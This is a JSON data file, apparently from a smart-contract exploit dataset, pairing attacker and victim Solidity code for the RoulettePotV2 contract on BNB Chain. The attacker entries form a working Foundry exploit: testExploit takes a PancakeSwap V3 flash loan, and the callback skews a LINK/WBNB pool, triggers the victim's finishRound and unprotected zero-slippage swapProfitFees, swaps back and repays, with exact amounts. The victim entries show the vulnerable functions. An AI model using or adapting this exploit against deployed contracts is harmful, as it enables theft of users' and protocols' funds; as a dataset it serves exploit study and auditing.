[
  {
    "contract/interface": "RoulettePotV2",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "RoulettePotV2",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RoulettePotV2",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RoulettePotV2",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RoulettePotV2",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "RoulettePotV2",
    "source_type": "attacker_contract",
    "function_name": "pancakeV3FlashCallback",
    "original_code": "    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes memory data) external {\n        uint256 amount = abi.decode(data, (uint256));\n\n        uint256 amount0Out = 0;\n        uint256 amount1Out = 17_527_795_283_271_427_200_665;\n        address to = address(this);\n        IUniswapV2Pair(PancakeSwap).swap(amount0Out, amount1Out, to, new bytes(0));\n\n        IRoulettePotV2(RoulettePotV2).finishRound();\n\n        IRoulettePotV2(RoulettePotV2).swapProfitFees();\n\n        uint256 balance = IERC20(LINK).balanceOf(address(this));\n        IERC20(LINK).transfer(PancakeSwap, balance);\n\n        amount0Out = 4_243_674_096_928_729_821_513;\n        amount1Out = 0;\n        IUniswapV2Pair(PancakeSwap).swap(amount0Out, amount1Out, to, new bytes(0));\n\n        IERC20(WBNB).transfer(PancakeV3Pool, amount+fee1);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "RoulettePotV2",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", blocknumToForkFrom);\n        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit\n        fundingToken = address(WBNB);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RoulettePotV2",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RoulettePotV2",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RoulettePotV2",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RoulettePotV2",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "RoulettePotV2",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RoulettePotV2",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RoulettePotV2",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public balanceLog {\n        address recipient = PancakeSwap;\n        uint256 amount0 = 0;\n        uint256 amount1 = 4_203_732_130_200_000_000_000;\n        bytes memory data = abi.encode(amount1);\n        IPancakeV3Pool(PancakeV3Pool).flash(recipient, amount0, amount1, data);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IRoulettePotV2",
    "source_type": "victim_contract",
    "function_name": "finishRound",
    "original_code": "    function finishRound() external nonReentrant {\n        require(isVRFPending == true, 'VRF not requested');\n\n        (bool fulfilled, uint256[] memory nonces) = IVRFv2Consumer(consumerAddress).getRequestStatus(requestId);\n        require(fulfilled == true, 'not yet fulfilled');\n\n        uint256 length = currentBetCount;\n        uint256 linkPerRound = linkPerBet;\n        uint256 i;\n\n        for (i = 0; i < length; ++i) {\n            BetInfo memory info = currentBets[i];\n            linkSpent[info.tokenId] += (linkPerRound / length);\n            _finishUserBet(info, nonces[0]);\n        }\n\n        isVRFPending = false;\n        delete roundLiveTime;\n        delete currentBetCount;\n        emit RoundFinished(roundIds, nonces[0] % 38);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IRoulettePotV2",
    "source_type": "victim_contract",
    "function_name": "swapProfitFees",
    "original_code": "    function swapProfitFees() external {\n        IPancakeRouter02 router = IPancakeRouter02(pancakeRouterAddr);\n        address[] memory path = new address[](2);\n        uint256 totalBNBForGame;\n        uint256 totalBNBForLink;\n        uint256 length = casinoCount;\n        uint256 BNBPPool = 0;\n\n        // Swap each token to BNB\n        for (uint256 i = 1; i <= length; ++i) {\n            Casino memory casinoInfo = tokenIdToCasino[i];\n            IERC20 token = IERC20(casinoInfo.tokenAddress);\n\n            if (casinoInfo.liquidity == 0) continue;\n\n            uint256 availableProfit = casinoInfo.profit < 0 ? 0 : uint256(casinoInfo.profit);\n            if (casinoInfo.liquidity < availableProfit) {\n                availableProfit = casinoInfo.liquidity;\n            }\n\n            uint256 gameFee = (availableProfit * casinoInfo.fee) / 100;\n            uint256 amountForLinkFee = getTokenAmountForLink(casinoInfo.tokenAddress, linkSpent[i]);\n            _updateProfitInfo(i, uint256(gameFee), availableProfit);\n            casinoInfo.liquidity = tokenIdToCasino[i].liquidity;\n\n            // If fee from the profit is not enought for link, then use liquidity\n            if (gameFee < amountForLinkFee) {\n                if (casinoInfo.liquidity < (amountForLinkFee - gameFee)) {\n                    amountForLinkFee = gameFee + casinoInfo.liquidity;\n                    tokenIdToCasino[i].liquidity = 0;\n                } else {\n                    tokenIdToCasino[i].liquidity -= (amountForLinkFee - gameFee);\n                }\n                gameFee = 0;\n            } else {\n                gameFee -= amountForLinkFee;\n            }\n\n            // Update Link consumption info\n            _updateLinkConsumptionInfo(i, amountForLinkFee);\n\n            if (casinoInfo.tokenAddress == address(0)) {\n                totalBNBForGame += gameFee;\n                totalBNBForLink += amountForLinkFee;\n                continue;\n            }\n            if (casinoInfo.tokenAddress == BNBPAddress) {\n                BNBPPool += gameFee;\n                gameFee = 0;\n            }\n\n            path[0] = casinoInfo.tokenAddress;\n            path[1] = wbnbAddr;\n\n            if (gameFee + amountForLinkFee == 0) {\n                continue;\n            }\n            token.approve(address(router), gameFee + amountForLinkFee);\n            uint256[] memory swappedAmounts = router.swapExactTokensForETH(\n                gameFee + amountForLinkFee,\n                0,\n                path,\n                address(this),\n                block.timestamp\n            );\n            totalBNBForGame += (swappedAmounts[1] * gameFee) / (gameFee + amountForLinkFee);\n            totalBNBForLink += (swappedAmounts[1] * amountForLinkFee) / (gameFee + amountForLinkFee);\n        }\n\n        path[0] = wbnbAddr;\n        // Convert to LINK\n        if (totalBNBForLink > 0) {\n            path[1] = linkTokenAddr;\n\n            // Swap BNB into Link Token\n            uint256 linkAmount = router.swapExactETHForTokens{ value: totalBNBForLink }(\n                0,\n                path,\n                address(this),\n                block.timestamp\n            )[1];\n\n            // Convert Link to ERC677 Link\n            IERC20(linkTokenAddr).approve(pegSwapAddr, linkAmount);\n            PegSwap(pegSwapAddr).swap(linkAmount, linkTokenAddr, link677TokenAddr);\n\n            // Fund VRF subscription account\n            LinkTokenInterface(link677TokenAddr).transferAndCall(\n                coordinatorAddr,\n                linkAmount,\n                abi.encode(subscriptionId)\n            );\n            emit SuppliedLink(linkAmount);\n        }\n\n        // Swap the rest of BNB to BNBP\n        if (totalBNBForGame > 0) {\n            path[1] = BNBPAddress;\n            BNBPPool += router.swapExactETHForTokens{ value: totalBNBForGame }(0, path, address(this), block.timestamp)[\n                1\n            ];\n        }\n\n        if (BNBPPool > 0) {\n            // add BNBP to tokenomics pool\n            IERC20(BNBPAddress).approve(potAddress, BNBPPool);\n            IPotLottery(potAddress).addAdminTokenValue(BNBPPool);\n\n            emit SuppliedBNBP(BNBPPool);\n        }\n    }\n\n    receive() external payable {}\n}\n",
    "description": ""
  }
]